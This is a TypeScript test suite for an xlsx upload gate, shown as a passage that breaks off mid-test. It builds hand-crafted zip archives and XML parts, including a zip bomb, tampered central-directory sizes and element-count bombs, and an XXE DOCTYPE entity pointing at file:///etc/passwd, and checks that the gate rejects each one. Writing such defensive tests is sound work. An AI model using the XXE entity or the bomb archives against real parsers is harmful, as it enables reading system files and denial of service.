import { describe, it, expect } from 'vitest';
import { zipSync, unzipSync, strToU8, type Unzipped } from 'fflate';
import { SpreadsheetFileError, type SpreadsheetFileErrorCode } from './errors';
import {
  MAX_DECOMPRESSED_BYTES,
  MAX_FORMULA_SCAN_UNITS,
  MAX_FORMULA_TEXT_LENGTH,
  MAX_WORKBOOK_RELS_BYTES,
  MAX_XMLNS_DECLARATIONS_PER_PART,
  MAX_XML_DOM_WEIGHT,
  MAX_XML_NAME_LENGTH,
  MAX_XML_TOTAL_BYTES,
  MAX_ZIP_ENTRIES,
  XML_ATTRIBUTE_WEIGHT,
  XML_ELEMENT_WEIGHT,
  XML_TEXT_NODE_WEIGHT,
} from './constants';
import { openUpload, streamArchive, type GuardOpts } from './guards';
import { readWorkbookGrid } from './parse';
import { readZipLayout } from './patch/raw-zip';
import {
  isUnsafeContentDetail,
  UNSAFE_CONTENT_DETAILS,
  UNSAFE_CONTENT_REASONS,
  UPLOAD_LIMIT_REASONS,
  ZIP_REJECT_REASONS,
  type UnsafeContentDetail,
} from './patch/reasons';
import { checkUploadParts } from './read-grid';
import { columnLetters } from './sheet-meta';
import { buildXlsxFixture, worksheetXml } from './testing/build-xlsx';
import {
  contentTypesXml,
  PACKAGE_PART_CASES,
  SAFE_PART_CASES,
  UNSAFE_PART_CASES,
  utf7Markup,
  type PackagePartCase,
} from '../tests/helpers/package-parts';
import { fileErrorOf } from '../tests/helpers/errors';
import { expectWithinBudget, FORMULA_SCAN_BUDGET_MS } from '../tests/helpers/timing';
import {
  entriesText,
  grownFixtureText,
  numberRows,
  rawDeflateArchive,
} from '../tests/helpers/workbooks';

const opts = { rowCap: 5000, colCap: 64, maxBytes: 10 * 1024 * 1024 };

const SPREADSHEET_NS = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const RELATIONSHIPS_NS = 'http://schemas.openxmlformats.org/package/2006/relationships';
const OFFICE_REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const WORKSHEET_REL = `${OFFICE_REL}/worksheet`;
const SHARED_STRINGS_REL = `${OFFICE_REL}/sharedStrings`;
const STYLES_REL = `${OFFICE_REL}/styles`;
const THEME_REL = `${OFFICE_REL}/theme`;
const OFFICE_DOCUMENT_REL = `${OFFICE_REL}/officeDocument`;
const EXTENDED_PROPERTIES_REL = `${OFFICE_REL}/extended-properties`;
// A relationship type no rule knows, short enough to pad a part cheaply.
const PADDING_REL = 'urn:pad';
const ROOT_RELS_PART = '_rels/.rels';
const UPPER_CASE_ROOT_RELS_PART = '_RELS/.rels';
const WORKBOOK_RELS_PART = 'xl/_rels/workbook.xml.rels';
const WORKBOOK_PART = 'xl/workbook.xml';
const SHEET_PART = 'xl/worksheets/sheet1.xml';
const SHARED_STRINGS_PART = 'xl/sharedStrings.xml';
const STYLES_PART = 'xl/styles.xml';
// A worksheet stored under a relationships part name that is not .xml.rels.
const BIN_RELS_SHEET_PART = 'xl/worksheets/data.rels';
const BIN_RELS_SHEET_TARGET = 'worksheets/data.rels';
const SHEET_RELS_PART = 'xl/worksheets/_rels/sheet1.xml.rels';
const XML_DECLARATION = '<?xml version="1.0" encoding="UTF-8"?>';
const UTF7_DECLARATION = '<?xml version="1.0" encoding="UTF-7"?>';
// 'e' with an acute accent in Latin-1: a UTF-8 lead byte that no continuation byte follows here.
const LATIN1_E_ACUTE = 0xe9;
const LOCAL_UNCOMPRESSED_SIZE_OFFSET = 22;
// A DOM-weight budget small enough for hand-built parts to cross.
const SMALL_WEIGHT = 10_000;
const SMALL_BUDGET = { ...opts, maxDomWeight: SMALL_WEIGHT };
const WEIGHT_UNITS = 100;
const TAG_BOMB_STRINGS = 20_000;
// Product-limit shapes: the default row cap plus the header row.
const FULL_ROWS = 5001;
const WIDE_COLUMNS = 64;
const TRENDYOL_COLUMNS = 35;
const WIDEST_TRENDYOL_FIXTURE = 'trendyol-commission-tariff.xlsx';
const BASIC_ROWS = [['Barkod'], ['B1']];
const BASIC_SHEET = { name: 'Sheet1', xml: worksheetXml(BASIC_ROWS) };
// A six-column product sheet: string keys and titles, numeric money columns.
const PRODUCT_SHEET_NAME = 'Urunler';
const PRODUCT_HEADER = ['Key', 'Barcode', 'Title', 'Cost', 'Price', 'Profit'];
const PRODUCT_ROW_1 = ['V1', '1', 't', 1, 2, 1];
const PRODUCT_ROW_2 = ['V2', '2', 't2', 2, 3, 1];
const IMAGE_BYTES = 1024 * 1024;
const SMALL_DECOMPRESSED_CAP = 64 * 1024;
// A declared uncompressed size far beyond any real entry (2 GiB - 1, below the
// zip64 marker): what an export's unzipSync would try to allocate.
const LARGE_DECLARED_SIZE = 0x7fffffff;
// Excel writes one xmlns:a16 and one xmlns:a14 per picture, plus three on the root.
const DRAWING_PICTURES = 40;
const CONDITIONAL_FORMATS = 70;
const CUSTOM_XML_NAME = 'Musteri_x0020_Ozel_x0020_Kolon_x0020_Adi';
const CENTRAL_DIRECTORY_SIGNATURE = 0x02014b50; // 'PK\x01\x02'
const END_OF_CENTRAL_DIRECTORY_SIGNATURE = 0x06054b50; // 'PK\x05\x06'
const CENTRAL_HEADER_FIXED_BYTES = 46;
const CENTRAL_UNCOMPRESSED_SIZE_OFFSET = 24;
const CENTRAL_NAME_LENGTH_OFFSET = 28;
const MAX_NAME = 'a'.repeat(MAX_XML_NAME_LENGTH);
const OVERLONG_NAME = 'a'.repeat(MAX_XML_NAME_LENGTH + 1);
const NESTED_XMLNS_COUNT = MAX_XMLNS_DECLARATIONS_PER_PART + 1;
// Loose on purpose: a byte scan rejects in microseconds; the bound only has to
// separate "rejected before parsing" from "parsed".
// Timing bounds are loose on purpose: check:all and CI run many suites in parallel, so a
// linear pass that takes milliseconds alone can take seconds under load. The regressions
// these tests guard against are quadratic or allocation blow-ups that take minutes or
// crash, so a bound in the tens of seconds still separates the two.
const FAST_REJECT_MS = 15_000;
const LOCAL_FILE_SIGNATURE = 0x04034b50; // 'PK\x03\x04'
const ZIP_VERSION = 20;
const STORED_METHOD = 0;
const DEFLATED_METHOD = 8;

interface StoredEntry {
  readonly name: string;
  readonly text: string;
  /** General purpose flags of its local header and directory record; none by default. */
  readonly flags?: number;
}

/** One central-directory record pointing at local entry `local`; `name`/`originalSize` override. */
interface CentralRecord {
  readonly local: number;
  readonly name?: string;
  readonly originalSize?: number;
}

function u16(value: number): Buffer {
  const out = Buffer.alloc(2);
  out.writeUInt16LE(value);
  return out;
}

function u32(value: number): Buffer {
  const out = Buffer.alloc(4);
  out.writeUInt32LE(value >>> 0);
  return out;
}

/**
 * A stored (uncompressed) zip whose central directory is written from `central`
 * (default: one record per local entry). CRCs are zero: neither fflate path
 * checks them.
 */
function storedZip(entries: readonly StoredEntry[], central?: readonly CentralRecord[]): Buffer {
  const locals: Buffer[] = [];
  const offsets: number[] = [];
  let offset = 0;
  for (const entry of entries) {
    const name = Buffer.from(entry.name);
    const data = Buffer.from(entry.text);
    const header = Buffer.concat([
      u32(LOCAL_FILE_SIGNATURE),
      u16(ZIP_VERSION),
      u16(entry.flags ?? 0),
      u16(STORED_METHOD),
      u16(0),
      u16(0),
      u32(0),
      u32(data.length),
      u32(data.length),
      u16(name.length),
      u16(0),
      name,
      data,
    ]);
    offsets.push(offset);
    locals.push(header);
    offset += header.length;
  }

  const records: readonly CentralRecord[] = central ?? entries.map((_, local) => ({ local }));
  const directory = records.map((record) => {
    const entry = entries[record.local];
    const localOffset = offsets[record.local];
    if (entry === undefined || localOffset === undefined) throw new Error('bad local index');
    const name = Buffer.from(record.name ?? entry.name);
    const size = Buffer.byteLength(entry.text);
    return Buffer.concat([
      u32(CENTRAL_DIRECTORY_SIGNATURE),
      u16(ZIP_VERSION),
      u16(ZIP_VERSION),
      u16(entry.flags ?? 0),
      u16(STORED_METHOD),
      u16(0),
      u16(0),
      u32(0),
      u32(size),
      u32(record.originalSize ?? size),
      u16(name.length),
      u16(0),
      u16(0),
      u16(0),
      u16(0),
      u32(0),
      u32(localOffset),
      name,
    ]);
  });
  const directoryBytes = Buffer.concat(directory);
  const end = Buffer.concat([
    u32(END_OF_CENTRAL_DIRECTORY_SIGNATURE),
    u16(0),
    u16(0),
    u16(records.length),
    u16(records.length),
    u32(directoryBytes.length),
    u32(offset),
    u16(0),
  ]);
  return Buffer.concat([...locals, directoryBytes, end]);
}

// Zeroes the end-of-central-directory signature. The streaming guard reads local
// headers only, so it still passes; the central-directory unzip cannot find the
// directory and fflate throws its own error.
function breakEndOfCentralDirectory(file: Buffer): Buffer {
  const out = Buffer.from(file);
  for (let i = out.length - 4; i >= 0; i -= 1) {
    if (out.readUInt32LE(i) !== END_OF_CENTRAL_DIRECTORY_SIGNATURE) continue;
    out.writeUInt32LE(0, i);
    return out;
  }
  throw new Error('end of central directory not found');
}

// One column, `count` rows (row 1 header + data rows), enough to cross opts.rowCap.
function tallRows(count: number): string[][] {
  return Array.from({ length: count }, (_, i) => [`B${i}`]);
}

// Rewrites the uncompressedSize field of one central-directory entry. The local
// header is left intact, so the streaming guard (which reads local headers)
// still passes and only the central-directory reader sees the inflated claim.
function patchCentralUncompressedSize(file: Buffer, entryName: string, size: number): Buffer {
  const out = Buffer.from(file);
  for (let i = 0; i + CENTRAL_HEADER_FIXED_BYTES <= out.length; i += 1) {
    if (out.readUInt32LE(i) !== CENTRAL_DIRECTORY_SIGNATURE) continue;
    const nameLength = out.readUInt16LE(i + CENTRAL_NAME_LENGTH_OFFSET);
    const nameStart = i + CENTRAL_HEADER_FIXED_BYTES;
    if (out.toString('utf8', nameStart, nameStart + nameLength) !== entryName) continue;
    out.writeUInt32LE(size, i + CENTRAL_UNCOMPRESSED_SIZE_OFFSET);
    return out;
  }
  throw new Error(`central directory entry not found: ${entryName}`);
}

// Writes `size` into the uncompressed-size field of the entry's local header and of its
// central directory record alike, so the zip layout still agrees with itself.
function withDeclaredSize(file: Buffer, entryName: string, size: number): Buffer {
  const entry = readZipLayout(file).entries.find((candidate) => candidate.name === entryName);
  if (entry === undefined) throw new Error(`zip entry not found: ${entryName}`);
  const out = Buffer.from(file);
  out.writeUInt32LE(size, entry.headerOffset + LOCAL_UNCOMPRESSED_SIZE_OFFSET);
  out.writeUInt32LE(size, entry.recordOffset + CENTRAL_UNCOMPRESSED_SIZE_OFFSET);
  return out;
}

// The DOM weight of `text`, counted with regexes independently of the gate's byte
// loop: element start tags, '=' bytes, and text-like nodes (every '>' followed by a
// character other than '<', plus every comment, CDATA section or processing
// instruction, i.e. every '<!' or '<?').
function domWeight(text: string): number {
  const count = (pattern: RegExp): number => (text.match(pattern) ?? []).length;
  return (
    XML_ELEMENT_WEIGHT * count(/<(?![/!?])/g) +
    XML_ATTRIBUTE_WEIGHT * count(/=/g) +
    XML_TEXT_NODE_WEIGHT * (count(/>(?=[^<])/g) + count(/<[!?]/g))
  );
}

// A sheet whose odd columns hold distinct shared strings and even columns numbers,
// plus its shared strings part.
function sharedStringSheet(rows: number, columns: number): { sheet: string; strings: string } {
  const strings: string[] = [];
  let body = '';
  for (let r = 1; r <= rows; r += 1) {
    let row = `<row r="${r}">`;
    for (let c = 1; c <= columns; c += 1) {
      const ref = `${columnLetters(c)}${r}`;
      if (c % 2 === 1) {
        strings.push(`<si><t>Urun ${r} kolon ${c}</t></si>`);
        row += `<c r="${ref}" t="s"><v>${strings.length - 1}</v></c>`;
      } else {
        row += `<c r="${ref}"><v>${r * c}</v></c>`;
      }
    }
    body += `${row}</row>`;
  }
  return {
    sheet: `<worksheet xmlns="${SPREADSHEET_NS}"><sheetData>${body}</sheetData></worksheet>`,
    strings: `<sst xmlns="${SPREADSHEET_NS}">${strings.join('')}</sst>`,
  };
}

type Relationship = readonly [type: string, target: string];

const SHEET_RELATIONSHIP: Relationship = [WORKSHEET_REL, 'worksheets/sheet1.xml'];
const SHARED_STRINGS_RELATIONSHIP: Relationship = [SHARED_STRINGS_REL, 'sharedStrings.xml'];
const STYLES_RELATIONSHIP: Relationship = [STYLES_REL, 'styles.xml'];
// The root relationship buildXlsxFixture writes.
const OFFICE_DOCUMENT_RELATIONSHIP: Relationship = [OFFICE_DOCUMENT_REL, WORKBOOK_PART];

// A workbook rels part holding one Relationship per entry, in order.
function relsXml(relationships: readonly Relationship[], prefix = ''): string {
  const p = prefix === '' ? '' : `${prefix}:`;
  const ns =
    prefix === '' ? `xmlns="${RELATIONSHIPS_NS}"` : `xmlns:${prefix}="${RELATIONSHIPS_NS}"`;
  const body = relationships
    .map(
      ([type, target], i) =>
        `<${p}Relationship Id="rId${i + 1}" Type="${type}" Target="${target}"/>`,
    )
    .join('');
  return `<?xml version="1.0" encoding="UTF-8"?><${p}Relationships ${ns}>${body}</${p}Relationships>`;
}

// Sheet1 plus the given parts, with workbook rels holding exactly `relationships`.
function workbookWith(
  relationships: readonly Relationship[],
  parts: Readonly<Record<string, string>> = {},
): Buffer {
  return buildXlsxFixture([BASIC_SHEET], {
    [WORKBOOK_RELS_PART]: relsXml(relationships),
    ...parts,
  });
}

// Sheet1 plus a shared strings part the workbook rels point at.
function withSharedStrings(sharedStrings: string): Buffer {
  return workbookWith([SHEET_RELATIONSHIP, SHARED_STRINGS_RELATIONSHIP], {
    [SHARED_STRINGS_PART]: sharedStrings,
  });
}

// Sheet1 plus a styles part the workbook rels point at.
function withStyles(styles: string): Buffer {
  return workbookWith([SHEET_RELATIONSHIP, STYLES_RELATIONSHIP], { [STYLES_PART]: styles });
}

// The reader parts of a one-sheet workbook with a shared strings part.
const SHARED_STRINGS_READER_PARTS: readonly string[] = [
  WORKBOOK_RELS_PART,
  WORKBOOK_PART,
  SHEET_PART,
  SHARED_STRINGS_PART,
];

// Names of the reader parts the gate returns for `file`, sorted.
function readerPartNames(file: Buffer, o: GuardOpts): string[] {
  return Object.keys(openUpload(file, o)).sort();
}

// Excel's drawing part for `pictures` pictures: three declarations on the root plus
// xmlns:a16 and xmlns:a14 on every picture.
function drawingXml(pictures: number): string {
  const picture = (i: number): string =>
    `<xdr:twoCellAnchor><xdr:pic><xdr:nvPicPr><xdr:cNvPr id="${i}" name="Resim ${i}"><a:extLst>` +
    '<a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">' +
    `<a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{${i}}"/>` +
    '</a:ext></a:extLst></xdr:cNvPr><xdr:cNvPicPr/></xdr:nvPicPr><xdr:blipFill>' +
    `<a:blip r:embed="rId${i}"><a:extLst><a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">` +
    '<a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>' +
    '</a:ext></a:extLst></a:blip></xdr:blipFill><xdr:spPr/></xdr:pic><xdr:clientData/>' +
    '</xdr:twoCellAnchor>';
  return (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing"' +
    ' xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"' +
    ` xmlns:r="${OFFICE_REL}">` +
    Array.from({ length: pictures }, (_, i) => picture(i + 1)).join('') +
    '</xdr:wsDr>'
  );
}

// A worksheet carrying `count` x14 conditional formats; Excel repeats xmlns:xm on each.
function conditionalFormatSheetXml(count: number): string {
  const format = (i: number): string =>
    '<x14:conditionalFormatting xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">' +
    `<x14:cfRule type="dataBar" id="{${i}}"/><xm:sqref>A${i}</xm:sqref></x14:conditionalFormatting>`;
  return (
    `<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="${SPREADSHEET_NS}"><sheetData>` +
    '<row r="1"><c r="A1" t="inlineStr"><is><t>Barkod</t></is></c></row>' +
    '<row r="2"><c r="A2" t="inlineStr"><is><t>B1</t></is></c></row></sheetData>' +
    '<extLst><ext xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"' +
    ' uri="{78C0D931-6437-407d-A8EE-F0AAD7539E65}"><x14:conditionalFormattings>' +
    Array.from({ length: count }, (_, i) => format(i + 1)).join('') +
    '</x14:conditionalFormattings></ext></extLst></worksheet>'
  );
}

// A part holding exactly `elements` element start tags: an <sst> wrapper plus
// empty children, and nothing else the weight counts.
function partWithElements(elements: number): string {
  return `<sst>${'<x/>'.repeat(elements - 1)}</sst>`;
}

// A part holding exactly `count` nested namespace declarations.
function partWithXmlns(count: number): string {
  return `<sst>${'<e xmlns:p="u">'.repeat(count)}${'</e>'.repeat(count)}</sst>`;
}

// The product sheet: the header row followed by `rows`.
function productsFile(rows: ReadonlyArray<ReadonlyArray<string | number>>): Buffer {
  return buildXlsxFixture([
    { name: PRODUCT_SHEET_NAME, xml: worksheetXml([PRODUCT_HEADER, ...rows]) },
  ]);
}

// Type-safe helper: run the gate alone (openUpload, then checkUploadParts: every
// reader part parsed strictly and checked, no grid built) and return the error if it
// throws SpreadsheetFileError, null if it succeeds, or re-throw anything unexpected.
// Reader rules are not checked, so a workbook without sheets passes.
function catchGuard(file: Buffer, o: GuardOpts): SpreadsheetFileError | null {
  try {
    checkUploadParts(openUpload(file, o), { rowCap: o.rowCap, colCap: o.colCap });
    return null;
  } catch (e) {
    if (e instanceof SpreadsheetFileError) return e;
    throw e;
  }
}

describe('upload gate', () => {
  it('rejects a non-zip (no PK magic) as NOT_XLSX', () => {
    const err = catchGuard(Buffer.from('hello world'), opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('NOT_XLSX');
  });

  it('rejects a zip lacking xlsx structure as NOT_XLSX', () => {
    const notXlsx = Buffer.from(zipSync({ 'a.txt': strToU8('x') }));
    const err = catchGuard(notXlsx, opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('NOT_XLSX');
  });

  it('rejects an oversize buffer as PAYLOAD_TOO_LARGE', () => {
    const big = Buffer.alloc(opts.maxBytes + 1, 0x50);
    const err = catchGuard(big, opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  // Only a cap a caller tells apart names its rule; the byte cap stays without one.
  it('refuses an oversize buffer without a reason in its meta', () => {
    const err = catchGuard(Buffer.alloc(opts.maxBytes + 1, 0x50), opts);
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
    expect(err?.meta).not.toHaveProperty('reason');
  });

  it('accepts a well-formed xlsx without throwing', () => {
    const buf = productsFile([PRODUCT_ROW_1]);
    expect(catchGuard(buf, opts)).toBeNull();
  });

  it('rejects cells beyond colCap as COL_CAP_EXCEEDED', () => {
    const err = catchGuard(productsFile([PRODUCT_ROW_1]), { ...opts, colCap: 2 });
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('COL_CAP_EXCEEDED');
  });

  it('rejects cells beyond rowCap as ROW_CAP_EXCEEDED', () => {
    const err = catchGuard(productsFile([PRODUCT_ROW_1, PRODUCT_ROW_2]), { ...opts, rowCap: 1 });
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('ROW_CAP_EXCEEDED');
  });

  it('fires streaming ceiling on a crafted zip-bomb payload', () => {
    // 300_000 bytes of repeating '0' compresses to ~300 bytes;
    // a tiny maxDecompressedBytes cap of 1_000 forces the streaming guard
    // to abort before the full payload is inflated, proving the ceiling
    // fires from real inflated bytes, not from attacker-controlled metadata.
    const bomb = Buffer.from(zipSync({ 'bomb.xml': strToU8('0'.repeat(300_000)) }));
    const err = catchGuard(bomb, { ...opts, maxDecompressedBytes: 1_000 });
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  it('rejects a relocated worksheet over the row cap as ROW_CAP_EXCEEDED', () => {
    const file = buildXlsxFixture([
      {
        name: 'Sheet1',
        xml: worksheetXml(tallRows(5002)),
        partPath: 'xl/worksheets/data.xml',
        relTarget: 'worksheets/data.xml',
      },
    ]);
    const err = catchGuard(file, opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('ROW_CAP_EXCEEDED');
  });

  it('rejects a prefixed worksheet over the row cap as ROW_CAP_EXCEEDED', () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetXml(tallRows(5002), { prefix: 'x' }) },
    ]);
    const err = catchGuard(file, opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('ROW_CAP_EXCEEDED');
  });

  it('rejects a cell-reference row beyond the cap as ROW_CAP_EXCEEDED', () => {
    const xml =
      `<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="${SPREADSHEET_NS}"><sheetData>` +
      `<row r="1"><c r="A900000" t="inlineStr"><is><t>Barkod</t></is></c></row>` +
      `</sheetData></worksheet>`;
    const err = catchGuard(buildXlsxFixture([{ name: 'Sheet1', xml }]), opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('ROW_CAP_EXCEEDED');
  });

  it('rejects a workbook whose worksheet declares a DOCTYPE as UNSAFE_CONTENT', () => {
    const xml =
      `<?xml version="1.0" encoding="UTF-8"?>` +
      `<!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
      `<worksheet xmlns="${SPREADSHEET_NS}"><sheetData>` +
      `<row r="1"><c r="A1" t="inlineStr"><is><t>&xxe;</t></is></c></row>` +
      `</sheetData></worksheet>`;
    const err = catchGuard(buildXlsxFixture([{ name: 'Sheet1', xml }]), opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('UNSAFE_CONTENT');
  });

  // The central-directory size never sizes an allocation any more: the entries
  // come from the stream, and a directory that disagrees with it is corrupt. No
  // canonical archive can hold this disagreement: the zip layout check, which runs
  // before the stream, finds the record and its local header disagreeing first.
  it('rejects a central-directory size that disagrees with the stream as CORRUPT_FILE', () => {
    const file = buildXlsxFixture([{ name: 'Sheet1', xml: worksheetXml([['Barkod'], ['B1']]) }]);
    const patched = patchCentralUncompressedSize(file, 'xl/worksheets/sheet1.xml', 0x7fffffff);
    const err = catchGuard(patched, opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('CORRUPT_FILE');
    expect(err?.meta).toMatchObject({ reason: ZIP_REJECT_REASONS.LAYOUT });
  });

  it('rejects a shared-strings element bomb beyond the element budget as PAYLOAD_TOO_LARGE', () => {
    const sharedStrings =
      `<?xml version="1.0" encoding="UTF-8"?><sst xmlns="${SPREADSHEET_NS}">` +
      `${'<si><t>a</t></si>'.repeat(TAG_BOMB_STRINGS)}</sst>`;
    const err = catchGuard(withSharedStrings(sharedStrings), SMALL_BUDGET);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  // The gate's weight must equal the regex count exactly (accepted at it, rejected one
  // below), and one more unit must cost exactly that node kind's weight.
  it.each([
    ['empty elements', '<x/>', XML_ELEMENT_WEIGHT],
    ['elements with an attribute', '<x a=""/>', XML_ELEMENT_WEIGHT + XML_ATTRIBUTE_WEIGHT],
    ['elements with a text node', '<x>y</x>', XML_ELEMENT_WEIGHT + XML_TEXT_NODE_WEIGHT],
    ['comments', '<!--c-->', XML_TEXT_NODE_WEIGHT],
    ['processing instructions', '<?p x?>', XML_TEXT_NODE_WEIGHT],
    ['CDATA sections', '<![CDATA[y]]>', XML_TEXT_NODE_WEIGHT],
  ])('charges %s their DOM weight, at the budget and one over', (_label, unit, unitWeight) => {
    const file = withSharedStrings(`<sst>${unit.repeat(WEIGHT_UNITS)}</sst>`);
    const more = withSharedStrings(`<sst>${unit.repeat(WEIGHT_UNITS + 1)}</sst>`);
    const weight = domWeight(entriesText(file, SHARED_STRINGS_READER_PARTS));

    expect(catchGuard(file, { ...opts, maxDomWeight: weight })).toBeNull();
    expect(catchGuard(file, { ...opts, maxDomWeight: weight - 1 })?.code).toBe('PAYLOAD_TOO_LARGE');
    expect(catchGuard(more, { ...opts, maxDomWeight: weight + unitWeight })).toBeNull();
    expect(catchGuard(more, { ...opts, maxDomWeight: weight + unitWeight - 1 })?.code).toBe(
      'PAYLOAD_TOO_LARGE',
    );
  });

  // xmldom keeps the whitespace between tags as text nodes, so each counts.
  it('counts a text node for each run of whitespace between tags', () => {
    const compact = withSharedStrings('<sst><x/><x/></sst>');
    const pretty = withSharedStrings('<sst>\n<x/>\n<x/>\n</sst>');
    const weight = domWeight(entriesText(compact, SHARED_STRINGS_READER_PARTS));
    const whitespaceRuns = 3;

    expect(catchGuard(compact, { ...opts, maxDomWeight: weight })).toBeNull();
    const prettyWeight = weight + whitespaceRuns * XML_TEXT_NODE_WEIGHT;
    expect(catchGuard(pretty, { ...opts, maxDomWeight: prettyWeight })).toBeNull();
    expect(catchGuard(pretty, { ...opts, maxDomWeight: prettyWeight - 1 })?.code).toBe(
      'PAYLOAD_TOO_LARGE',
    );
  });

  it('never raises the weight budget above MAX_XML_DOM_WEIGHT', () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetXml(numberRows(FULL_ROWS, WIDE_COLUMNS)) },
    ]);
    const err = catchGuard(file, { ...opts, maxDomWeight: 2 * MAX_XML_DOM_WEIGHT });
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  // The weight refusal names its rule, so a caller can tell it from a size cap.
  it('names the DOM weight rule when a file weighs one unit over the budget', () => {
    const file = withSharedStrings(`<sst>${'<x/>'.repeat(WEIGHT_UNITS)}</sst>`);
    const budget = domWeight(entriesText(file, SHARED_STRINGS_READER_PARTS)) - 1;

    const err = catchGuard(file, { ...opts, maxDomWeight: budget });
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
    expect(err?.meta).toMatchObject({ reason: UPLOAD_LIMIT_REASONS.DOM_WEIGHT, cap: budget });
    expect(err?.meta).toHaveProperty('entry');
  });

  // Each part stays under the budget on its own; together they do not.
  it('rejects a weight split over several reader parts as PAYLOAD_TOO_LARGE', () => {
    const share = partWithElements(Math.ceil((0.6 * SMALL_WEIGHT) / XML_ELEMENT_WEIGHT));
    const one = workbookWith([SHEET_RELATIONSHIP, SHARED_STRINGS_RELATIONSHIP], {
      [SHARED_STRINGS_PART]: share,
    });
    const both = workbookWith(
      [SHEET_RELATIONSHIP, SHARED_STRINGS_RELATIONSHIP, STYLES_RELATIONSHIP],
      { [SHARED_STRINGS_PART]: share, [STYLES_PART]: share },
    );

    expect(catchGuard(one, SMALL_BUDGET)).toBeNull();
    expect(catchGuard(both, SMALL_BUDGET)?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  it('counts the weight of the workbook rels part', () => {
    const rels = relsXml([SHEET_RELATIONSHIP]).replace(
      '</Relationships>',
      `${'<x/>'.repeat(SMALL_WEIGHT / XML_ELEMENT_WEIGHT)}</Relationships>`,
    );
    const file = buildXlsxFixture([BASIC_SHEET], { [WORKBOOK_RELS_PART]: rels });
    expect(catchGuard(file, SMALL_BUDGET)?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  // xmldom builds an attribute without a value (`<z a0 a1/>`) after only a warning, so
  // the strict parse keeps it as a node; with no '=' to charge, each such name is
  // charged as an attribute instead.
  it('charges attributes that have no value', () => {
    const count = Math.ceil(SMALL_WEIGHT / XML_ATTRIBUTE_WEIGHT) + 1;
    const names = Array.from({ length: count }, (_, i) => `a${i}`);
    const withElement = (element: string): Buffer =>
      buildXlsxFixture([
        {
          name: 'Sheet1',
          xml: worksheetXml(BASIC_ROWS).replace('<sheetData>', `${element}<sheetData>`),
        },
      ]);

    expect(catchGuard(withElement(`<z ${names.join(' ')}/>`), SMALL_BUDGET)?.code).toBe(
      'PAYLOAD_TOO_LARGE',
    );
    // The same names with values weigh the same; without attributes it fits.
    expect(
      catchGuard(withElement(`<z ${names.map((n) => `${n}=""`).join(' ')}/>`), SMALL_BUDGET)?.code,
    ).toBe('PAYLOAD_TOO_LARGE');
    expect(catchGuard(withElement('<z/>'), SMALL_BUDGET)).toBeNull();
  });

  it('does not count names inside quoted values or around a spaced equals sign', () => {
    const count = Math.ceil(SMALL_WEIGHT / XML_ATTRIBUTE_WEIGHT) + 1;
    const words = Array.from({ length: count }, (_, i) => `w${i}`).join(' ');
    const file = buildXlsxFixture([
      {
        name: 'Sheet1',
        xml: worksheetXml(BASIC_ROWS).replace('<sheetData>', `<z a = "${words}"/><sheetData>`),
      },
    ]);
    expect(catchGuard(file, SMALL_BUDGET)).toBeNull();
  });

  // The gate parses the rels to find the parts the reader opens, so the rels part has
  // its own byte cap, checked before that parse.
  it('rejects workbook rels over MAX_WORKBOOK_RELS_BYTES as PAYLOAD_TOO_LARGE', () => {
    const relsWithComment = (length: number): string =>
      relsXml([SHEET_RELATIONSHIP]).replace(
        '</Relationships>',
        `<!--${'x'.repeat(length)}--></Relationships>`,
      );
    const over = buildXlsxFixture([BASIC_SHEET], {
      [WORKBOOK_RELS_PART]: relsWithComment(MAX_WORKBOOK_RELS_BYTES),
    });
    const under = buildXlsxFixture([BASIC_SHEET], {
      [WORKBOOK_RELS_PART]: relsWithComment(MAX_WORKBOOK_RELS_BYTES / 2),
    });

    expect(catchGuard(over, opts)?.code).toBe('PAYLOAD_TOO_LARGE');
    expect(catchGuard(under, opts)).toBeNull();
  });

  // The reader opens only entries ending in .xml or .xml.rels that the workbook rels
  // name; `_rels/.rels` is neither, so it is neither budgeted nor a reader part. It is
  // a valid root relationships part, padded with relationships of another type to a
  // weight the budget would refuse.
  it('ignores an entry the reader never opens', () => {
    const padding = Array.from(
      { length: Math.ceil(SMALL_WEIGHT / (XML_ELEMENT_WEIGHT + 3 * XML_ATTRIBUTE_WEIGHT)) },
